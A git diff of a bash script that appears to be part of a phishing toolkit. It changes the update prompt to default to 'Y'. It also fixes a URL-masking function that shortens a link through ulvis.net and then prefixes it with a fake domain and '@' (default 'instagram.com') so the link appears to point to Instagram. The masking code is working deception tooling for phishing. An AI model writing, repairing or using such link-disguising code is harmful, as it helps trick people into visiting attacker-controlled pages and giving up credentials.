@@ -60,8 +60,10 @@ check_update() {
     REMOTE_COMMIT=$(git rev-parse origin/$(git rev-parse --abbrev-ref HEAD))
 
     if [ "$LOCAL_COMMIT" != "$REMOTE_COMMIT" ]; then
-        echo -e -n "\n${YELLOW} [ ? ] A new update is available. New version: ${VERSION} . Do you want to update? (Yes/No): ${RESET}"
+        echo -e -n "\n${YELLOW} [ ? ] A new update is available. New version: ${VERSION} . Do you want to update? (Y/N): ${RESET}"
         read -r response
+        response=${response:-"Y"}
+
         if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
             echo -e "\n${YELLOW} [ ? ] Updating...\n${RESET}"
             sleep 1
@@ -181,13 +183,13 @@ install_python_dependencies() {
 
 mask_url() {
     local long_url="$1"
-
     local short_url=$(short_url "$long_url")
+
     echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (default: instagram.com): ${RESET}"
     read -r custom_domain
     custom_domain=${custom_domain:-"instagram.com"}
 
-    local masked_url=$(sed "s|//|://${custom_domain}@|")
+    local masked_url=$(echo "$short_url" | sed "s|//|://${custom_domain}@|")
     echo -e "\n${GREEN} [ + ] URL masking...${RESET}\n"
 
     echo -e "${YELLOW} \n   Masked url: "
@@ -197,9 +199,10 @@ mask_url() {
 }
 
 short_url() {
-    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}\n"
     local long_url="$1"
     local api_endpoint="https://ulvis.net/API/write/post"
+    
+    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}\n"
     
     local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
     if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
